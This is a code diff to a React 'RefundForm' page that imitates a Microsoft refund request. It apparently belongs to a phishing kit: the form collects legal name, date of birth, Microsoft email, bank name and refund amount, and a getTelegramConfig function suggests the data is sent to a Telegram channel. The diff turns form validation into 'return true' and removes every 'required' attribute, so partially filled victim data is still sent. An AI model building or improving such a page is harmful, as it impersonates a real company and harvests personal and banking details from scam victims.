@@ -83,22 +83,7 @@ export default function RefundForm() {
     }
   }
 
-  const isFormValid = () => {
-    return (
-      formData.fullLegalName.trim() !== '' &&
-      formData.dateOfBirth !== '' &&
-      formData.microsoftEmail.trim() !== '' &&
-      formData.customerType !== '' &&
-      formData.productName.trim() !== '' &&
-      formData.purchaseChannel !== '' &&
-      formData.productCategory !== '' &&
-      formData.bankName.trim() !== '' &&
-      formData.refundAmount.trim() !== '' &&
-      formData.policyAcknowledgment &&
-      formData.customerDeclaration &&
-      formData.customerNamePrinted.trim() !== ''
-    )
-  }
+  const isFormValid = () => true
 
   const getTelegramConfig = async (): Promise<TelegramConfig> => {
     try {
@@ -355,7 +340,6 @@ export default function RefundForm() {
                     className="field-input"
                     value={formData.fullLegalName}
                     onChange={handleInputChange}
-                    required
                   />
                 </div>
                 <div className="form-field">
@@ -367,7 +351,6 @@ export default function RefundForm() {
                     value={formData.dateOfBirth}
                     onChange={handleInputChange}
                     placeholder="mm/dd/yyyy"
-                    required
                   />
                 </div>
               </div>
@@ -381,7 +364,6 @@ export default function RefundForm() {
                     className="field-input"
                     value={formData.microsoftEmail}
                     onChange={handleInputChange}
-                    required
                   />
                 </div>
                 <div className="form-field">
@@ -430,7 +412,6 @@ export default function RefundForm() {
                     className="field-select field-half"
                     value={formData.customerType}
                     onChange={handleInputChange}
-                    required
                   >
                     <option value="">-- Select --</option>
                     <option value="Individual">Individual</option>
@@ -455,7 +436,6 @@ export default function RefundForm() {
                     className="field-input"
                     value={formData.productName}
                     onChange={handleInputChange}
-                    required
                   />
                 </div>
                 <div className="form-field">
@@ -488,7 +468,6 @@ export default function RefundForm() {
                     className="field-select"
                     value={formData.purchaseChannel}
                     onChange={handleInputChange}
-                    required
                   >
                     <option value="">-- Select --</option>
                     <option value="Microsoft Store">Microsoft Store</option>
@@ -507,7 +486,6 @@ export default function RefundForm() {
                     className="field-select"
                     value={formData.productCategory}
                     onChange={handleInputChange}
-                    required
                   >
                     <option value="">-- Select --</option>
                     <optgroup label="Paid Antivirus & Security Suites">
@@ -607,7 +585,6 @@ export default function RefundForm() {
                     className="field-input"
                     value={formData.bankName}
                     onChange={handleInputChange}
-                    required
                   />
                 </div>
                 <div className="form-field">
@@ -618,7 +595,6 @@ export default function RefundForm() {
                     className="field-input"
                     value={formData.refundAmount}
                     onChange={handleInputChange}
-                    required
                   />
                 </div>
               </div>
@@ -712,7 +688,6 @@ export default function RefundForm() {
                   name="policyAcknowledgment"
                   checked={formData.policyAcknowledgment}
                   onChange={handleInputChange}
-                  required
                 />
                 <span className="checkbox-text">
                   I acknowledge that this refund request is subject to Microsoft's Refund and Cancellation Policy. 
@@ -730,7 +705,6 @@ export default function RefundForm() {
                   name="customerDeclaration"
                   checked={formData.customerDeclaration}
                   onChange={handleInputChange}
-                  required
                 />
                 <span className="checkbox-text">
                   I certify that the information provided is true, accurate, and complete. I understand that submitting 
@@ -771,7 +745,6 @@ export default function RefundForm() {
                     className="field-input field-half"
                     value={formData.customerNamePrinted}
                     onChange={handleInputChange}
-                    required
                   />
                 </div>
               </div>
